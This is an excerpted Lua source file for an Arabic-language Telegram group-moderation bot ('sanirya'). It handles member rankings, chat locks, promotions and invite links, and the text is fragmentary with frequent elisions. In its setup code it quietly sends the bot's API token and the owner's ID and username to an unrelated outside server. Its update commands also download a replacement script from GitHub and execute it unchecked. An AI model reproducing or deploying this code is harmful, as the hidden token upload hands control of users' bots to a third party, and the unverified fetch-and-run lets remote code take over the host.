...
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
res = https.request('http://Tshake.ga/sanirya/sanirya.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("sanirya", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/sanirya
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./sanirya.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("SR", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S sanirya -X kill
screen -S sanirya ./sanirya
done
]])  
file:close() 
...
local sanirya_Msg = ''  
if msgs < 100 then 
sanirya_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
sanirya_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
sanirya_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
sanirya_Msg = 'متفاعل' 
elseif msgs < 1200 then 
sanirya_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
sanirya_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
sanirya_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
sanirya_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
sanirya_Msg = 'قمه التفاعل' 
elseif msgs < 5500 then 
sanirya_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
sanirya_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
sanirya_Msg = 'امبراطور التفاعل' 
elseif msgs < 10000000000 then 
sanirya_Msg = 'رب التفاعل'  
end 
return sanirya_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function Sourcesanirya(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,sanirya_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf sanirya.lua')
os.execute('wget https://raw.githubusercontent.com/saniryaSR/sanirya/master/sanirya.lua')
...
send(msg.chat_id_, msg.id_,'⌔︙عدد المجموعات الان » { '..#group..' }'..saniryak..''..sanirya..'\n*⌔︙الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n⌔︙العضو » ['..result.title_..'](t.me/'..(username or 'saniryaV15')..')'
...
usertext = '\n⌔︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'saniryaV15')..')'
status  = '\n⌔︙تم ترقيته مطور في البوت'
...
--------------------------------------------------------------------------------------------------------------
if sanirya_Msg and not Special(msg) then  
local sanirya_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if sanirya_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..sanirya_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/saniryaV15)}\n📛¦["..sanirya_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
os.execute('rm -rf sanirya.lua')
os.execute('wget https://github.com/sarens3/sanirya/master/sanirys.lua')
send(msg.chat_id_, msg.id_,'??| تم تحديث البوت \n⌔︙لديك اخر اصدار سورس ساكورا\n📡| الاصدار ← { 1.2v}')
dofile('sanirya.lua')  
end
...
𓂅 .𝐒𝐀𝐍𝐀𝐑𝐈𝐀 𝐓𝐄𝐀𝐌 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . Source Channel(http://t.me/TTV_VV)

𓂅 . Source Info(http://t.me/gh_gh90)

𓂅 . TWS Sanaria(http://t.me/gh_gh90bot)
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'⌔︙بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'saniryaV15')..') \n⌔︙تـم قفـل الدردشه ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'saniryaV15')..') \n⌔︙تـم قفـل التاك بالكتم ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'🔰¦ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'sanirya')..') \n〽️¦ تـم قفـل التفليش ')  
end,nil)   
end
...
if link then                              
send(msg.chat_id_,msg.id_,'⌔︙𝒍𝒊𝒏𝒌 \n■---------------------------------■\n ['..link..']')                          
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'saniryaV15')..')'..'\n⌔︙تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..sanirya_Msg[math.random(#sanirya_Msg)]..']') 
return false
end
--------------------------------------------------------------------------------------------------------------
...
sanirya = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(sanirya)
...
--------------------------------------------------------------------------------------------------------------
Sourcesanirya(data.message_,data)
...
------------------------------------------------------------------------
local saniryabot = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if saniryabot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..saniryabot.."] \n") 
